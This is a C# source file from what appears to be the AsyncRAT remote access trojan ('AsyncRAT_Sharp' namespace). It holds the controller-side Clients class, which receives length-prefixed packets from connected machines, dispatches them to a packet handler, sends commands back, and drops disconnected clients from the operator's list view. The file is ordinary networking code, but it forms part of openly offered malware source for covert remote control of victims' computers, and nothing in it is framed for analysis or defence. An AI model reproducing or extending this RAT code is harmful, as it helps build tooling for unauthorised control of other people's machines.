using System;
using System.Text;
using System.IO;
using System.Net.Sockets;
using System.Windows.Forms;
using AsyncRAT_Sharp.Handle_Packet;
using System.Threading.Tasks;

namespace AsyncRAT_Sharp.Sockets
{
    class Clients
    {
        public Socket Client { get; set; }
        private byte[] Buffer { get; set; }
        private long Buffersize { get; set; }
        private bool BufferRecevied { get; set; }
        private MemoryStream MS { get; set; }
        public ListViewItem LV { get; set; }
        private object SendSync { get; set; }
        public string ID { get; set; }

        public Clients(Socket CLIENT)
        {
            Client = CLIENT;
            Buffer = new byte[1];
            Buffersize = 0;
            BufferRecevied = false;
            MS = new MemoryStream();
            LV = null;
            SendSync = new object();
            Client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadClientData, null);
        }

        public async void ReadClientData(IAsyncResult ar)
        {
            try
            {
                if (!Client.Connected)
                {
                    Disconnected();
                    return;
                }
                else
                {
                    int Recevied = Client.EndReceive(ar);
                    if (Recevied > 0)
                    {
                        if (BufferRecevied == false)
                            if (Buffer[0] == 0)
                            {
                                Buffersize = Convert.ToInt64(Encoding.UTF8.GetString(MS.ToArray()));
                                MS.Dispose();
                                MS = new MemoryStream();
                                if (Buffersize > 0)
                                {
                                    Buffer = new byte[Buffersize - 1];
                                    BufferRecevied = true;
                                }
                            }
                            else
                                await MS.WriteAsync(Buffer, 0, Buffer.Length);
                        else
                        {
                            await MS.WriteAsync(Buffer, 0, Recevied);
                            if (MS.Length == Buffersize)
                            {
                                await Task.Run(() =>
                                {
                                    HandlePacket.Read(this, MS.ToArray());
                                    Settings.Received += MS.ToArray().Length;
                                    Buffer = new byte[1];
                                    Buffersize = 0;
                                    MS.Dispose();
                                    MS = new MemoryStream();
                                    BufferRecevied = false;
                                });
                            }
                            else
                                Buffer = new byte[Buffersize - MS.Length];
                        }
                        Client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadClientData, null);
                    }
                    else
                    {
                        Disconnected();
                        return;
                    }
                }
            }
            catch
            {
                Disconnected();
                return;
            }
        }

        public void Disconnected()
        {
            if (LV != null)
            {
                if (Program.form1.listView1.InvokeRequired)
                    Program.form1.listView1.BeginInvoke((MethodInvoker)(() =>
                    {
                        LV.Remove();
                    }));
                lock (Settings.Online)
                    Settings.Online.Remove(this);
            }

            try
            {
                MS?.Dispose();
                Client?.Dispose();
            }
            catch { }
        }

        public void BeginSend(object Msgs)
        {
            lock (SendSync)
            {
                if (!Client.Connected)
                {
                    Disconnected();
                    return;
                }

                try
                {
                    using (MemoryStream MEM = new MemoryStream())
                    {
                        byte[] buffer = (byte[])Msgs;
                        byte[] buffersize = Encoding.UTF8.GetBytes(buffer.Length.ToString() + (char)0);
                        MEM.WriteAsync(buffersize, 0, buffersize.Length);
                        MEM.WriteAsync(buffer, 0, buffer.Length);
                        Client.Poll(-1, SelectMode.SelectWrite);
                        Client.BeginSend(MEM.ToArray(), 0, (int)MEM.Length, SocketFlags.None, EndSend, null);
                        Settings.Sent += (long)MEM.Length;
                    }
                }
                catch
                {
                    Disconnected();
                    return;
                }

            }
        }

        public void EndSend(IAsyncResult ar)
        {
            try
            {
                Client.EndSend(ar);
            }
            catch
            {
                Disconnected();
                return;
            }
        }
    }
}
